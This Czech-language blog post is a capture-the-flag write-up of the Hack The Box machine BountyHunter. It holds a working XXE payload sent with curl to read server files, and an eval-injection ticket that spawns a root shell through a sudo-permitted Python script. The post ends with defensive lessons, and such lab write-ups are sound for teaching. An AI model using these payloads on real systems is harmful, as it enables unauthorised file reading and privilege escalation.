---
layout: post
author: Tomáš Matějíček
title: "BountyHunter"
date: 2020-11-11
tags: linux rce ssh sudo php exploit
---

## Úvod a kontext

BountyHunter je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerace webu

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
```
```
[17:55:44] Starting:
[17:56:00] 301 -  313B  - /assets  ->  http://10.10.11.100/assets/     (Added to queue)
[17:56:03] 301 -  310B  - /css  ->  http://10.10.11.100/css/     (Added to queue)
=> [17:56:03] 200 -    0B  - /db.php
[17:56:07] 200 -   25KB - /index.php
[17:56:07] 200 -   25KB - /index.php/login/     (Added to queue)
[17:56:08] 301 -  309B  - /js  ->  http://10.10.11.100/js/     (Added to queue)
[17:56:14] 301 -  316B  - /resources  ->  http://10.10.11.100/resources/     (Added to queue)
[17:56:14] 200 -    3KB - /resources/
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
http://10.10.11.100/resources/README.txt
```
```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

### Spuštění exploitu (2)

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```bash
curl -v 'http://10.10.11.100/tracker_diRbPr00f314.php' --data-urlencode "data=$(echo '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE bugreport [<!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/tracker_diRbPr00f314.php">]><bugreport><title>aa</title><cwe>aa</cwe><cvss>aa</cvss><reward>&harmless;</reward></bugreport>' | base64 -w 0)"
```
```
<?php

if(isset($_POST['data'])) {
$xml = base64_decode($_POST['data']);
libxml_disable_entity_loader(false);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
$bugreport = simplexml_import_dom($dom);
}
?>
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td><?php echo $bugreport->title; ?></td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td><?php echo $bugreport->cwe; ?></td>
  </tr>
  <tr>
    <td>Score:</td>
    <td><?php echo $bugreport->cvss; ?></td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td><?php echo $bugreport->reward; ?></td>
  </tr>
</table>
```

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
ssh development@10.10.11.100
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.

```text
ssh development@10.10.11.100
cat user.txt
__CENSORED__
sudo -l
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Zásadní byla i implementace validátoru:
```python
validationNumber = eval(x.replace("**", ""))
```

```bash
cp /opt/skytrain_inc/invalid_tickets/390681613.md /tmp/shell.md
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```text
Skytrain Inc
```

Do ticketu pak stačilo vložit payload zneužívající `eval`:
```text
Ticket to New Haven
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
##Issued: 2021/04/06
#End Ticket
```

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py /tmp/shell.md
cat /root/root.txt
```

## Shrnutí klíčových poznatků

- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.

## Co si odnést do praxe

- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
